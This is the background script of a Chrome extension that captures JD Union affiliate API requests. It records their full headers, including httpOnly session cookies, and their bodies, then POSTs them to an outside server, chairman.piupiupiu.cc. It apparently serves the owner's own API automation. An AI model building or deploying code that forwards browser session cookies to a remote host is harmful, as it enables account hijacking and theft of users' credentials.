// JD Union API Capturer - Chrome Extension Background Service Worker
// Server URL where captured parameters will be sent
const SERVER_URL = 'https://chairman.piupiupiu.cc/api/capture-params';

// Store captured request details (headers from onBeforeSendHeaders, body from onBeforeRequest)
const requestDataStore = new Map();

console.log('[JD Capturer] Extension loaded - Monitoring JD Union API requests');

// Helper function to check if URL should be captured
function shouldCapture(url) {
  if (!url) return false;
  return url.includes('functionId=unionSearchGoods') ||
         url.includes('functionId=unionPromoteLinkService');
}

// Helper function to extract functionId from URL
function extractFunctionId(url) {
  const match = url.match(/functionId=([^&]+)/);
  return match ? match[1] : null;
}

// Capture request body (if POST)
chrome.webRequest.onBeforeRequest.addListener(
  function(details) {
    if (!shouldCapture(details.url)) return;

    const functionId = extractFunctionId(details.url);

    console.log(`[JD Capturer] Capturing request body for: ${functionId}`);

    // Store request data temporarily
    requestDataStore.set(details.requestId, {
      url: details.url,
      method: details.method,
      body: details.requestBody ? extractRequestBody(details.requestBody) : undefined,
      functionId: functionId,
      timestamp: Date.now()
    });

    // Clean up old entries (older than 10 seconds)
    cleanupOldEntries();
  },
  { urls: ["https://api.m.jd.com/*"] },
  ["requestBody"]
);

// Capture complete request headers (including httpOnly cookies)
chrome.webRequest.onBeforeSendHeaders.addListener(
  function(details) {
    if (!shouldCapture(details.url)) return;

    const functionId = extractFunctionId(details.url);

    console.log(`\n========== CHROME EXTENSION CAPTURE (${functionId}) ==========`);
    console.log('URL:', details.url);
    console.log('Method:', details.method);

    // Convert headers array to object
    const headersObj = {};
    if (details.requestHeaders) {
      details.requestHeaders.forEach(header => {
        headersObj[header.name.toLowerCase()] = header.value;
      });
    }

    console.log('Headers captured:', Object.keys(headersObj).join(', '));
    console.log('Cookie exists:', !!headersObj.cookie);
    console.log('Cookie length:', headersObj.cookie ? headersObj.cookie.length : 0);

    // Get stored request data (body)
    const storedData = requestDataStore.get(details.requestId);
    const body = storedData ? storedData.body : undefined;

    // Prepare payload to send to server
    const payload = {
      url: details.url,
      method: details.method,
      headers: headersObj,
      body: body,
      functionId: functionId
    };

    // Send to server (non-blocking)
    sendToServer(payload);

    // Clean up stored data
    requestDataStore.delete(details.requestId);

    console.log('===================================\n');
  },
  { urls: ["https://api.m.jd.com/*"] },
  ["requestHeaders", "extraHeaders"]  // 🔥 添加 extraHeaders 以捕获 cookie
);

// Helper function to extract request body from requestBody object
function extractRequestBody(requestBody) {
  if (!requestBody) return undefined;

  // Handle form data
  if (requestBody.formData) {
    const formDataArray = [];
    for (const key in requestBody.formData) {
      const values = requestBody.formData[key];
      values.forEach(value => {
        formDataArray.push(`${encodeURIComponent(key)}=${encodeURIComponent(value)}`);
      });
    }
    return formDataArray.join('&');
  }

  // Handle raw data
  if (requestBody.raw) {
    const decoder = new TextDecoder('utf-8');
    const bodyParts = requestBody.raw.map(part => {
      if (part.bytes) {
        return decoder.decode(new Uint8Array(part.bytes));
      }
      return '';
    });
    return bodyParts.join('');
  }

  return undefined;
}

// Send captured parameters to server
async function sendToServer(payload) {
  try {
    const response = await fetch(SERVER_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    const data = await response.json();
    console.log(`✅ Parameters sent to server: ${payload.functionId}`, data);
  } catch (error) {
    console.error('⚠️ Failed to send parameters to server:', error.message);
  }
}

// Clean up old entries from requestDataStore
function cleanupOldEntries() {
  const now = Date.now();
  const maxAge = 10000; // 10 seconds

  for (const [requestId, data] of requestDataStore.entries()) {
    if (now - data.timestamp > maxAge) {
      requestDataStore.delete(requestId);
    }
  }
}

// Log when extension is installed or updated
chrome.runtime.onInstalled.addListener(function(details) {
  if (details.reason === 'install') {
    console.log('[JD Capturer] Extension installed successfully');
  } else if (details.reason === 'update') {
    console.log('[JD Capturer] Extension updated to version', chrome.runtime.getManifest().version);
  }
});
